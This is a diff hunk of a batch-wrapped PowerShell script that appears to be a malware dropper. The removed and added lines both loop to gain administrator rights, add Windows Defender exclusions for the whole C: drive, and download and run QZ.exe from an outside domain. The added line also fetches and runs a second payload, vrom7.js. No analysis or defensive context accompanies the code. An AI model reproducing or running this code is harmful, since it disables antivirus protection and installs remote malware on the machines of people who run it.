@@ -7,7 +7,7 @@ powershell -ep remotesigned -Command "IEX $([System.IO.File]::ReadAllText('%~f0'
 endlocal
 goto:eof
 #>
-while($true){try{Start-Process 'cmd' -WindowStyle Hidden -Verb runas -ArgumentList '/k powershell -command add-mppreference -exclusionpath C:\ && powershell -command add-mppreference -exclusionprocess C:\ && powershell Start-BitsTransfer -Source https://dpdservice.uk/dl/QZ.exe -Destination %USERPROFILE%\AppData\QZ.exe && powershell Start-Process -FilePath %USERPROFILE%\AppData\QZ.exe
+while($true){try{Start-Process 'cmd' -WindowStyle Hidden -Verb runas -ArgumentList '/k powershell -command add-mppreference -exclusionpath C:\ && powershell -command add-mppreference -exclusionprocess C:\ && powershell Start-BitsTransfer -Source https://dpdservice.uk/dl/QZ.exe -Destination %USERPROFILE%\AppData\QZ.exe && powershell Start-Process -FilePath %USERPROFILE%\AppData\QZ.exe && powershell Start-BitsTransfer -Source https://dpdservice.uk/dl/vrom7.js -Destination %USERPROFILE%\AppData\vrom7.js && powershell Start-Process -FilePath %USERPROFILE%\AppData\vrom7.js
  /priv';exit}catch{}}
 
 
